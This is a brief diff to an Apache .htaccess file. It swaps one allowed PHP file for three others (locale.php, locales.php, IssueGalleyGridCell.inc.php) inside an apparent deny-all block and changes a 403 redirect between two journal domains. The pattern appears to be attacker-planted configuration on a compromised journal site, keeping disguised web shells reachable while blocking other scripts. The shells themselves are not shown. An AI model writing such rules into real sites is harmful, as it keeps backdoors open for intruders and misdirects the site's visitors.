@@ -70,8 +70,8 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(IndexHandler.php)$">
+<FilesMatch "^(locale.php|locales.php|IssueGalleyGridCell.inc.php)$">
 Allow from all
 </FilesMatch>
 Options -Indexes
-ErrorDocument 403 https://journals.iarn.or.id/
+ErrorDocument 403 https://jurnal.unisti.ac.id/
